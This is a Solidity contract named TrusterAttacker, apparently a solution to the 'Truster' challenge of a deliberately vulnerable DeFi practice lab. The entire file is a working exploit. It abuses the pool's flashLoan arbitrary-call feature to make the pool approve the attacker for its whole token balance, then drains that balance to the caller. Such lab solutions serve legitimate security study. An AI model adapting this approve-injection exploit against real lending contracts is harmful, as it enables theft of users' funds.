// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "solmate/src/tokens/ERC20.sol";

contract TrusterAttacker {

    function attack(address token, address trusterLP) external {
        TrusterLenderPool pool = TrusterLenderPool(trusterLP);
        uint256 poolBalance = ERC20(token).balanceOf(trusterLP);
        pool.flashLoan(
            0,
            msg.sender,
            token,
            abi.encodeWithSelector(
                ERC20.approve.selector,
                address(this),
                poolBalance
            )
        );

        ERC20(token).transferFrom(trusterLP, msg.sender, poolBalance);
    }

}